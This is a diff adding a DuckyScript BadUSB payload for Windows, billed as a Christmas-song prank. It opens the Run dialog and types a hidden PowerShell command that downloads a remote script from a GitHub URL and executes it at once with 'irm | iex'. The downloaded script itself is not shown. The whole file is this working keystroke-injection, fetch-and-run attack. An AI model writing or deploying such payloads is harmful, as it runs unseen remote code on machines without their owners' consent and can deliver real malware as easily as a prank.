@@ -1,0 +1,8 @@
+REM Title: All I want for Christmas roll
+REM Description: Play the All I want for Christmas sound at 100% volume
+REM Target OS: Windows 10+
+REM Author: SuperJakov
+GUI r
+DELAY 500
+STRING powershell -w h irm 'https://raw.githubusercontent.com/SuperJakov/Badusb/main/All%20I%20want%20for%20Christmas/all-I-want-for-Christmas.ps1' | iex
+ENTER
